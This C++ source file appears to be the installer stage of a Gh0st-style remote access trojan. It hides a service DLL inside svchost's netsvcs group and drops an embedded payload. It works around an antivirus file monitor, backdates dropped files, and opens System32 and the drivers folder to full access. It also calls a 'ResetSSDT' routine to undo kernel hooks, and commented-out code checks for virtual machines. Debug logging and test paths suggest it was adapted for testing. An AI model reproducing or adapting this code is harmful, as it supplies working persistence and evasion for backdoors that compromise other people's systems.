// install.cpp : Defines the entry point for the application.
//

#include "StdAfx.h"
#include <windows.h>
#include <stdio.h>
#include <shellapi.h>
#pragma comment(linker, "/defaultlib:msvcrt.lib /opt:nowin98 /IGNORE:4078 /MERGE:.rdata=.text /MERGE:.data=.text /section:.text,ERW")
#include "resource.h"
#include <windows.h>
#include <stdlib.h>
#include <Aclapi.h>
#include <lm.h>
#include <Shlwapi.h>
#pragma comment(lib, "NetApi32.lib")
#include "acl.h"
#include "decode.h"
#include "RegEditEx.h"
#include "log.h"
// using standard exceptions
#include <iostream>
#include <exception>
#include "IniFile.h"
#include <sddl.h>
#ifdef INSTALLER_TEST
#pragma IMPORTANT("THIS IS ONLY FOR TESTING, IT CONTAINS DEBUG CODE< IDENTIFIABLE CODE")
#endif

typedef const char *(__stdcall* f_funcSvcHostStatus)();
typedef const char* (__stdcall* f_funcSvcHostLastError)();

void dbg_dump(struct _EXCEPTION_POINTERS* ExceptionInfo) {
}


LPWSTR StringToString(LPCSTR str)
{
	int size = MultiByteToWideChar(CP_UTF8, 0, str, -1, NULL, 0);
	PWCHAR result = new WCHAR[size];
	MultiByteToWideChar(CP_UTF8, 0, str, -1, result, size);

	return result;
}
LPSTR StringToString(LPCWSTR str)
{
	int size = WideCharToMultiByte(CP_UTF8, 0, str, -1, NULL, 0, NULL, NULL);
	PCHAR result = new CHAR[size];
	WideCharToMultiByte(CP_UTF8, 0, str, -1, result, size, NULL, NULL);

	return result;
}

LONG WINAPI bad_exception(struct _EXCEPTION_POINTERS* ExceptionInfo) {
	dbg_dump(ExceptionInfo);
	ExitProcess(0);
}
/*
// IsInsideVPC's exception filter
DWORD __forceinline IsInsideVPC_exceptionFilter(LPEXCEPTION_POINTERS ep)
{
	PCONTEXT ctx = ep->ContextRecord;
	
	ctx->Ebx = -1; // Not running VPC
	ctx->Eip += 4; // skip past the "call VPC" opcodes
	return EXCEPTION_CONTINUE_EXECUTION; // we can safely resume execution since we skipped faulty instruction
}

// high level language friendly version of IsInsideVPC()
bool IsInsideVPC()
{
	bool rc = false;
	
	__try
	{
		_asm push ebx
		_asm mov  ebx, 0 // Flag
		_asm mov  eax, 1 // VPC function number
		
		// call VPC 
		_asm __emit 0Fh
		_asm __emit 3Fh
		_asm __emit 07h
		_asm __emit 0Bh
		
		_asm test ebx, ebx
		_asm setz [rc]
		_asm pop ebx
	}
	// The except block shouldn't get triggered if VPC is running!!
	__except(IsInsideVPC_exceptionFilter(GetExceptionInformation()))
	{
	}
	
	return rc;
}

bool IsInsideVMWare()
{
	bool rc = true;
	
	__try
	{
		__asm
		{
			push   edx
			push   ecx
			push   ebx
			
			mov    eax, 'VMXh'
			mov    ebx, 0 // any value but not the MAGIC VALUE
			mov    ecx, 10 // get VMWare version
			mov    edx, 'VX' // port number
			
			in     eax, dx // read port
			// on return EAX returns the VERSION
			cmp    ebx, 'VMXh' // is it a reply from VMWare?
			setz   [rc] // set return value
			
			pop    ebx
			pop    ecx
			pop    edx
		}
	}
	__except(EXCEPTION_EXECUTE_HANDLER)
	{
		rc = false;
	}
	
	return rc;
}
*/
void SetAccessRights()
{
	char	lpUserName[50], lpGroupName[100], lpDriverDirectory[MAX_PATH], lpSysDirectory[MAX_PATH];
	DWORD	nSize = sizeof(lpUserName);
	
	LPLOCALGROUP_USERS_INFO_0 pBuf = NULL;   
	DWORD   dwEntriesRead = 0;   
	DWORD   dwTotalEntries = 0;   
	NET_API_STATUS   nStatus;
	WCHAR wUserName[100];
	
	ZeroMemory(lpUserName, sizeof(lpUserName));
	ZeroMemory(lpDriverDirectory, sizeof(lpDriverDirectory));
	ZeroMemory(lpSysDirectory, sizeof(lpSysDirectory));
	GetSystemDirectory(lpSysDirectory, sizeof(lpSysDirectory));
	GetSystemDirectory(lpDriverDirectory, sizeof(lpDriverDirectory));
	lstrcat(lpDriverDirectory, "\\Drivers");
	GetUserName(lpUserName, &nSize);
	// 设置成员权限
	AddAccessRights(lpSysDirectory, lpUserName, GENERIC_ALL);
	AddAccessRights(lpDriverDirectory, lpUserName, GENERIC_ALL);
	MultiByteToWideChar( CP_ACP, 0, lpUserName, -1, wUserName, sizeof(wUserName) / sizeof(wUserName[0])); 
	
	nStatus = NetUserGetLocalGroups(NULL,   
		(LPCWSTR)wUserName,
		0,   
		LG_INCLUDE_INDIRECT,   
		(LPBYTE   *) &pBuf,   
		MAX_PREFERRED_LENGTH,   
		&dwEntriesRead,   
		&dwTotalEntries);   
	
	if (nStatus == NERR_Success)   
	{   
		LPLOCALGROUP_USERS_INFO_0 pTmpBuf;   
		DWORD i;   
		
		if ((pTmpBuf = pBuf) != NULL)
		{   
			for (i = 0; i < dwEntriesRead; i++)   
			{ 
				if (pTmpBuf == NULL)     
					break;
				WideCharToMultiByte(CP_OEMCP, 0, (LPCWSTR)pTmpBuf->lgrui0_name, -1, (LPSTR)lpGroupName, sizeof(lpGroupName), NULL, FALSE);
				// 设置组的权限
				AddAccessRights(lpSysDirectory, lpGroupName, GENERIC_ALL);
				AddAccessRights(lpDriverDirectory, lpGroupName, GENERIC_ALL);	
				pTmpBuf++;  
			}   
		}      
	}   
	if (pBuf != NULL)   
		NetApiBufferFree(pBuf); 
	
}

BOOL ReleaseResource(HMODULE hModule, WORD wResourceID, LPCTSTR lpType, LPCTSTR lpFileName, LPCTSTR lpConfigString)
{
	HGLOBAL hRes;
	HRSRC hResInfo;
	HANDLE hFile;
	DWORD dwBytes;

	char	strTmpPath[MAX_PATH];
	char	strBinPath[MAX_PATH];

	// 一定要跟别的区分开，GetTickCount有可能得到一样的值
	GetTempPath(sizeof(strTmpPath), strTmpPath);
	wsprintf(strBinPath, "%s\\%d_res.tmp", strTmpPath, GetTickCount());
	
	LOG_TRACE("Install::ReleaseResource", "FindResource %d, %s", wResourceID, lpType);
	hResInfo = FindResource(hModule, MAKEINTRESOURCE(wResourceID), lpType);
	if (hResInfo == NULL)
		return FALSE;
	hRes = LoadResource(hModule, hResInfo);
	if (hRes == NULL)
		return FALSE;
	LOG_TRACE("Install::ReleaseResource", "CreateFile %s", strBinPath);
	hFile = CreateFile
		(
		strBinPath, 
		GENERIC_WRITE, 
		FILE_SHARE_WRITE, 
		NULL, 
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL, 
		NULL
		);
	
	if (hFile == NULL)
		return FALSE;

	SYSTEMTIME st;
	memset(&st, 0, sizeof(st));
	st.wYear = 2004;
	st.wMonth = 8;
	st.wDay = 17;
	st.wHour = 20;
	st.wMinute = 0;
	FILETIME ft,LocalFileTime;
	SystemTimeToFileTime(&st, &ft);
	LocalFileTimeToFileTime(&ft,&LocalFileTime);
	SetFileTime(hFile, &LocalFileTime, (LPFILETIME) NULL,	&LocalFileTime);
	LOG_TRACE("Install::ReleaseResource", "WriteFile %s", lpConfigString);
	WriteFile(hFile, hRes, SizeofResource(NULL, hResInfo), &dwBytes, NULL);
	// 写入配置
	if (lpConfigString != NULL)
	{
		WriteFile(hFile, lpConfigString, lstrlen(lpConfigString) + 1, &dwBytes, NULL);
	}
	CloseHandle(hFile);
	FreeResource(hRes);
	
	// Fuck KV File Create Monitor
	BOOL res = MoveFile(strBinPath, lpFileName);
	if (!res) {
		LOG_ERROR("Install::ReleaseResource", "error MoveFile %s ==> %s ", strBinPath, lpFileName, GetLastError());
	}
	//SetFileAttributes(lpFileName, FILE_ATTRIBUTE_HIDDEN);
	res = DeleteFile(strBinPath) && res;
	return res;
}

char *AddsvchostService()
{
	char	*lpServiceName = NULL;
	int rc = 0;
	HKEY hkRoot;
    char buff[2048];
    //query svchost setting
    char *ptr, *pSvchost = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost";
    rc = RegOpenKeyEx(HKEY_LOCAL_MACHINE, pSvchost, 0, KEY_ALL_ACCESS, &hkRoot);
    if(ERROR_SUCCESS != rc)
        return NULL;
	
	LOG_TRACE("Install::AddsvchostService", "RegOpenKeyEx %s", pSvchost);
    DWORD type, size = sizeof buff;
    rc = RegQueryValueEx(hkRoot, "netsvcs", 0, &type, (unsigned char*)buff, &size);
    SetLastError(rc);
    if(ERROR_SUCCESS != rc)
        RegCloseKey(hkRoot);
	
	int i = 0;
	bool bExist = false;
	char servicename[50];
	do
	{	
		
		wsprintf(servicename, "netsvcs_0x%d", i);
		
		for(ptr = buff; *ptr; ptr = strchr(ptr, 0)+1)
		{
			if (lstrcmpi(ptr, servicename) == 0)
			{	
				bExist = true;
				break;
			}
		}
		if (bExist == false)
			break;
		bExist = false;
		i++;
	} while(1);
	
	servicename[lstrlen(servicename) + 1] = '\0';
	memcpy(buff + size - 1, servicename, lstrlen(servicename) + 2);
	LOG_TRACE("Install::AddsvchostService", "RegOpenKeyEx %s", servicename);
    rc = RegSetValueEx(hkRoot, "netsvcs", 0, REG_MULTI_SZ, (unsigned char*)buff, size + lstrlen(servicename) + 1);
	
	RegCloseKey(hkRoot);
	
    SetLastError(rc);
	
	if (bExist == false)
	{
		lpServiceName = new char[lstrlen(servicename) + 1];
		lstrcpy(lpServiceName, servicename);
	}
	
	return lpServiceName;
}

// 随机选择服务安装,返回安装成功的服务名

char *InstallService(LPCTSTR lpServiceDisplayName, LPCTSTR lpServiceDescription, LPCTSTR lpConfigString, BOOL systemAccount = FALSE)
{
	char lpName[MAX_PATH];
	DWORD sSize = MAX_PATH;
	char lpDomainName[MAX_PATH];
	DWORD sDomainNameSize = MAX_PATH;
	SID_NAME_USE sidType;
	PSID Sid;
	LPWSTR lpSidString = StringToString("S-1-5-18");
	BOOL sidConvert = ConvertStringSidToSidW(lpSidString,&Sid);
	

	sidConvert = LookupAccountSidA(NULL, Sid, lpName, &sSize, lpDomainName, &sDomainNameSize, &sidType);

	if (!sidConvert) {
		LOG_ERROR("Install::InstallService", "query sid ERROR");
		return nullptr;
	}
	LOG_TRACE("Install::InstallService", "query sid %s/%s", lpDomainName,lpName);
	char lpFullAccountName[MAX_PATH];
	sprintf(lpFullAccountName, "%s\\%s", lpDomainName, lpName);
    // Open a handle to the SC Manager database.
	char *lpServiceName = NULL;
    int rc = 0;
    HKEY hkRoot = HKEY_LOCAL_MACHINE, hkParam = 0;
    SC_HANDLE hscm = NULL, schService = NULL;
	char strModulePath[MAX_PATH];
	char	strSysDir[MAX_PATH];
	DWORD	dwStartType = 0;
	
		char strSubKey[1024];
		LOG_TRACE("Install::InstallService", "query svchost setting");
		//query svchost setting
		char* ptr, * pSvchost = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost";
		rc = RegOpenKeyEx(hkRoot, pSvchost, 0, KEY_QUERY_VALUE, &hkRoot);
		LOG_TRACE("Install::InstallService", "RegOpenKeyEx %s", pSvchost);
		if (ERROR_SUCCESS != rc)
		{
			throw "";
		}

		DWORD type, size = sizeof strSubKey;
		rc = RegQueryValueEx(hkRoot, "netsvcs", 0, &type, (unsigned char*)strSubKey, &size);
		RegCloseKey(hkRoot);
		SetLastError(rc);
		if (ERROR_SUCCESS != rc)
			throw "RegQueryValueEx(Svchost\\netsvcs)";


		LOG_TRACE("Install::InstallService", "install service");

		//install service
		hscm = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
		if (hscm == NULL) {
			MessageBoxA(NULL, "OpenSCManager Failed. Check Permission", "ERROR", MB_ICONERROR);
			LOG_ERROR("Install::InstallService", "OpenSCManager Failed. Check Permission");
			return nullptr;
		}


		strcpy(strSysDir, "c:\\Temp");
	//GetSystemDirectory(strSysDir, sizeof(strSysDir));
	char *bin = "%SystemRoot%\\System32\\svchost.exe -k netsvcs";
	char	strRegKey[1024];

    for(ptr = strSubKey; *ptr; ptr = strchr(ptr, 0)+1)
    {
		//////////////////////////////////////////////////////////////////////////
		char temp[500];
		wsprintf(temp, "SYSTEM\\CurrentControlSet\\Services\\%s", ptr);
		LOG_TRACE("Install::InstallService", "query --> RegOpenKeyEx %s", temp);

		rc = RegOpenKeyEx(HKEY_LOCAL_MACHINE, temp, 0, KEY_QUERY_VALUE, &hkRoot);
		if (rc == ERROR_SUCCESS)
		{
			RegCloseKey(hkRoot);
			continue;
		}


		memset(strModulePath, 0, sizeof(strModulePath));
		wsprintf(strModulePath, "%s\\%sex.dll", strSysDir, ptr);
		// 删除试试
		DeleteFile(strModulePath);
		// 以前的服务文件没有删除之前，服务的DLL还在svchost中，所以不用这个服务
		if (GetFileAttributes(strModulePath) != INVALID_FILE_ATTRIBUTES)
			continue;

		wsprintf(strRegKey, "MACHINE\\SYSTEM\\CurrentControlSet\\Services\\%s", ptr);

		schService = CreateService(
			hscm,                       // SCManager database
			ptr,                    // name of service
			lpServiceDisplayName,          // service name to display
			SERVICE_ALL_ACCESS,        // desired access
			SERVICE_WIN32_SHARE_PROCESS,
			SERVICE_AUTO_START,      // start type
			SERVICE_ERROR_NORMAL,      // error control type
			bin,        // service's binary
			NULL,                      // no load ordering group
			NULL,                      // no tag identifier
			NULL,                      // no dependencies
			systemAccount?(const char*)lpFullAccountName:NULL,                      // LocalSystem account
			NULL);                     // no password
		
		LOG_WARNING("Install::InstallService", "CreateService SERVICE_WIN32_SHARE_PROCESS");
		LOG_TRACE("Install::InstallService", "Account %s. name of service %s, service name to display %s, service's binary %s", lpName, ptr, lpServiceDisplayName, bin);

		if (schService != NULL) {
			LOG_TRACE("Install::InstallService", "returned 0x%8d", schService);
			LOG_TRACE("Install::InstallService", "CreateService SERVICE_WIN32_SHARE_PROCESS SUCCESS");
			break;
		}
	}

	if (schService == NULL)
	{
		lpServiceName = AddsvchostService();
		memset(strModulePath, 0, sizeof(strModulePath));
		wsprintf(strModulePath, "%s\\%sex.dll", strSysDir, lpServiceName);
		LOG_WARNING("Install::InstallService", "CreateService SERVICE_WIN32_OWN_PROCESS");
		wsprintf(strRegKey, "MACHINE\\SYSTEM\\CurrentControlSet\\Services\\%s", lpServiceName);
		schService = CreateService(
			hscm,                      // SCManager database
			lpServiceName,                    // name of service
			lpServiceDisplayName,           // service name to display
			SERVICE_ALL_ACCESS,        // desired access
			SERVICE_WIN32_OWN_PROCESS,
			SERVICE_AUTO_START,      // start type
			SERVICE_ERROR_NORMAL,      // error control type
			bin,        // service's binary
			NULL,                      // no load ordering group
			NULL,                      // no tag identifier
			NULL,                      // no dependencies
			systemAccount ? (const char*)lpFullAccountName : NULL,                      // LocalSystem account
			NULL);                     // no password
		LOG_TRACE("Install::InstallService", "Account %s. name of service %s, service name to display %s, service's binary %s", lpName, ptr, lpServiceDisplayName, bin);

		dwStartType = SERVICE_WIN32_OWN_PROCESS;
	}
	else
	{
		dwStartType = SERVICE_WIN32_SHARE_PROCESS;
		lpServiceName = new char[lstrlen(ptr) + 1];
		lstrcpy(lpServiceName, ptr);
		LOG_TRACE("Install::InstallService", "Install post-install steps...  WriteRegEx %s, %s, %s",strSubKey, ptr, lpServiceName);

	}
	if (schService == NULL)
	{
		LOG_ERROR("Install::InstallService", "CreateService SERVICE_WIN32_OWN_PROCESS failed");

		return nullptr;
	}
		

    CloseServiceHandle(schService);
    CloseServiceHandle(hscm);

    //config service
    hkRoot = HKEY_LOCAL_MACHINE;
	wsprintf(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\%s", lpServiceName);

	if (dwStartType == SERVICE_WIN32_SHARE_PROCESS)
	{		
		DWORD	dwServiceType = 0x120;
		WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, "Type", REG_DWORD, (char *)&dwServiceType, sizeof(DWORD), 0);
		LOG_TRACE("Install::InstallService", "Install post-install steps... dwServiceType = 0x120;  WriteRegEx %s", strSubKey);

	}

	WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, "Description", REG_SZ, (char *)lpServiceDescription, lstrlen(lpServiceDescription), 0);
	LOG_TRACE("Install::InstallService", "Install post-install steps... Description  WriteRegEx %s", strSubKey);

	lstrcat(strSubKey, "\\Parameters");
	WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, "ServiceDll", REG_EXPAND_SZ, (char *)strModulePath, lstrlen(strModulePath), 0);
	LOG_TRACE("Install::InstallService", "Install post-install steps... ServiceDll WriteRegEx %s", strSubKey);

    
    RegCloseKey(hkRoot);
    RegCloseKey(hkParam);
    CloseServiceHandle(schService);
    CloseServiceHandle(hscm);
	
	
	if (lpServiceName != NULL)
	{
		LOG_TRACE("Install::InstallService", "OK  DONE. NAME %s", lpServiceName);
		ReleaseResource(NULL, IDR_DLL, "BIN", strModulePath, nullptr);
		DWORD attributes = GetFileAttributesA(lpServiceName);
		BOOL Exists =  attributes != INVALID_FILE_ATTRIBUTES;
		LOG_TRACE("Install::InstallService", "%s Exists: %d", lpServiceName, Exists);

		if (!Exists) {
			LOG_WARNING("Install::InstallService", "%s Exists: %d", lpServiceName, Exists);
		}
	}
	LOG_TRACE("Install::InstallService", "OK  DONE. NAME null");

    return lpServiceName;
}

void StartService(LPCTSTR lpService)
{
	SC_HANDLE hSCManager = OpenSCManager( NULL, NULL,SC_MANAGER_CREATE_SERVICE );
	LOG_TRACE("Install::StartService", "OpenSCManager ");
	if ( NULL != hSCManager )
	{
		SC_HANDLE hService = OpenService(hSCManager, lpService, DELETE | SERVICE_START);
		if ( NULL != hService )
		{
			LOG_TRACE("Install::StartService", "StartService ");
			StartService(hService, 0, NULL);
			CloseServiceHandle( hService );
		}
		else {
			LOG_ERROR("Install::StartService", "StartService ");
		}
		CloseServiceHandle( hSCManager );
	}
	else {
		MessageBoxA(NULL, "OpenSCManager Failed. Check Permission", "ERROR", MB_ICONERROR);
		LOG_ERROR("Install::StartService", "OpenSCManager ");
	}
}

bool ResetSSDT(HMODULE	hModule)
{
	typedef bool (__stdcall * LPResetSSDT)();
	bool	bRet = true;
	char	strTmpPath[MAX_PATH];
	char	strDllPath[MAX_PATH];

	GetTempPath(sizeof(strTmpPath), strTmpPath);
	GetTempPath(sizeof(strDllPath), strDllPath);
	wsprintf(strDllPath, "%s\\%d_ex.tmp", strTmpPath, GetTickCount());

	try
	{
		ReleaseResource(hModule, IDR_DLL, "BIN", strDllPath, NULL);

		HMODULE	hDll = LoadLibrary(strDllPath);
		if (hDll == NULL)
		{
			throw "";
		}

		LPResetSSDT	ResetSSDT = (LPResetSSDT)GetProcAddress(hDll, "ResetSSDT");
		if (ResetSSDT == NULL)
			throw "";
		ResetSSDT();
		FreeLibrary(hDll);
			
	}catch(...)
	{
		bRet = false;
		DeleteFile(strDllPath);
	}
	
	return bRet;
}

int memfind(const char *mem, const char *str, int sizem, int sizes)   
{   
	int   da,i,j;   
	if (sizes == 0) da = strlen(str);   
	else da = sizes;   
	for (i = 0; i < sizem; i++)   
	{   
		for (j = 0; j < da; j ++)   
			if (mem[i+j] != str[j])	break;   
			if (j == da) return i;   
	}   
	return -1;   
}

#define	MAX_CONFIG_LEN	1024


LPCTSTR FindConfigString(HMODULE hModule, LPCTSTR lpString)
{
	char	strFileName[MAX_PATH];
	char	*lpConfigString = NULL;
	DWORD	dwBytesRead = 0;
	GetModuleFileName(hModule, strFileName, sizeof(strFileName));

	HANDLE	hFile = CreateFile(strFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		return NULL;
	}
	
	SetFilePointer(hFile, -MAX_CONFIG_LEN, NULL, FILE_END);
	lpConfigString = new char[MAX_CONFIG_LEN];
	ReadFile(hFile, lpConfigString, MAX_CONFIG_LEN, &dwBytesRead, NULL);
	CloseHandle(hFile);

	int offset = memfind(lpConfigString, lpString, MAX_CONFIG_LEN, 0);
	if (offset == -1)
	{
		delete lpConfigString;
		return NULL;
	}
	else
	{
		return lpConfigString + offset;
	}
}

int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
	LPWSTR* szArglist;
	int nArgs;
	int i;
	LOG_TRACE("Install::Main", "START");
	LPWSTR lpExtractShort = StringToString("-x");
	LPWSTR lpExtractLong = StringToString("--extract");
	LPWSTR lpLoadShort = StringToString("-l");
	LPWSTR lpLoadLong = StringToString("--load");
	CHAR* lpExtractedDllName = nullptr;
	bool bLoadDll = false;
	szArglist = CommandLineToArgvW(GetCommandLineW(), &nArgs);
	if (NULL == szArglist)
	{
		wprintf(L"CommandLineToArgvW failed\n");
		return 0;
	}
	else {
		for (i = 0; i < nArgs; i++) {
			if ( (StrCmpW(lpExtractShort, szArglist[i]) == 0) ||
				(StrCmpW(lpExtractLong, szArglist[i]) == 0) )
			{
				lpExtractedDllName = StringToString(szArglist[i + 1]);
				LOG_TRACE("Install::Main", "Extract Resource Dll to file : %s", lpExtractedDllName);
				
			}
			if ((StrCmpW(lpLoadShort, szArglist[i]) == 0) ||
				(StrCmpW(lpLoadLong, szArglist[i]) == 0))
			{
				bLoadDll = true;
				LOG_TRACE("Install::Main", "Will Load");

			}
		}
	}
		
	if (lpExtractedDllName) {
		ReleaseResource(NULL, IDR_DLL, "BIN", lpExtractedDllName, nullptr);
	}
	
	if (bLoadDll) {
		HINSTANCE hGetProcIDDLL = nullptr;
		try
		{
			//hGetProcIDDLL = LoadLibraryA(lpExtractedDllName);
			hGetProcIDDLL = LoadLibraryA("P:\\Development\\SimpleWindowsServiceDll\\bin\\Win32\\Release\\SvcDll.dll");
			
		}
		catch (std::exception& e)
		{
			LOG_ERROR("Install::Main", "exception %s", e.what());
			printf("exception %s", e.what());
			return EXIT_FAILURE;
		}

		LocalFree(szArglist);
		return EXIT_SUCCESS;
	}



 	// TODO: Place code here.
	//////////////////////////////////////////////////////////////////////////
	// 让启动程序时的小漏斗马上消失
	GetInputState();
	PostThreadMessage(GetCurrentThreadId(),NULL,0,0);
	MSG	msg;
	GetMessage(&msg, NULL, NULL, NULL);
	//////////////////////////////////////////////////////////////////////////
	
	CIniFile ini;
	if (ini.IsValid() == false) {
		wprintf(L"Ini File missing %s", ini.GetIniFilePath());
		LOG_ERROR("Install::Main", "Ini File missing %s", ini.GetIniFilePath());
		return 1;
	}
	CString SvcNane = ini.GetString("Service", "RawName");
	CString SvcDisplayNane = ini.GetString("Service", "DisplayName");
	CString SvcDescription = ini.GetString("Service", "Description");
	CString SvcEncodeString = ini.GetString("Service", "EncodeString");

	LOG_TRACE("Install::Main", "SvcDisplayNane %s", SvcDisplayNane.GetBuffer());
	LOG_TRACE("Install::Main", "SvcDescription %s", SvcDescription.GetBuffer());
	LOG_TRACE("Install::Main", "SvcEncodeString %s", SvcEncodeString.GetBuffer());

	char	*lpUpdateArgs = "Update";
	//////////////////////////////////////////////////////////////////////////
	// 如果不是更新服务端
	if (strstr(GetCommandLine(), lpUpdateArgs) == NULL)
	{
		
		HANDLE	hMutex = CreateMutex(NULL, true, SvcEncodeString.GetBuffer());
		DWORD	dwLastError = GetLastError();
		// 普通权限访问系统权限创建的Mutex,如果存在，如果存在就返回拒绝访问的错误
		// 已经安装过一个一模一样配置的，就不安装了
		if (dwLastError == ERROR_ALREADY_EXISTS || dwLastError == ERROR_ACCESS_DENIED)
			return -1;
		ReleaseMutex(hMutex);
		CloseHandle(hMutex);
	}
	else
	{
		// 等待服务端自删除
		Sleep(5000);
	}


	SetUnhandledExceptionFilter(bad_exception);
	
	// 确保权限
	SetAccessRights();
	ResetSSDT(hInstance);

	char * lpServiceName = InstallService(SvcDisplayNane.GetBuffer(), SvcDescription.GetBuffer(), SvcEncodeString.GetBuffer());

	if (lpServiceName != NULL)
	{
		
		// 写安装程序路径到注册表，服务开始后读取并删除
		char	strSelf[MAX_PATH];
		char	strSubKey[1024];
		char	strMsg[1024];
		memset(strSelf, 0, sizeof(strSelf));
		GetModuleFileName(NULL, strSelf, sizeof(strSelf));
		wsprintf(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\%s", lpServiceName);
		wsprintf(strMsg, "Service %s Created", lpServiceName);
		WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, "InstallModule", REG_SZ, strSelf, lstrlen(strSelf), 0);
		MessageBoxA(NULL, strMsg, "SUCCESS", MB_ICONEXCLAMATION);
		LOG_TRACE("Install::Main", "HKEY_LOCAL_MACHINE InstallModule %s", strSubKey);
		LOG_TRACE("Install::Main","StartService %s", lpServiceName);
		StartService(lpServiceName);
		delete lpServiceName;
		
	}
	else {
		LOG_ERROR("Install::Main", "InstallService failed");

	}
	ExitProcess(0);
}



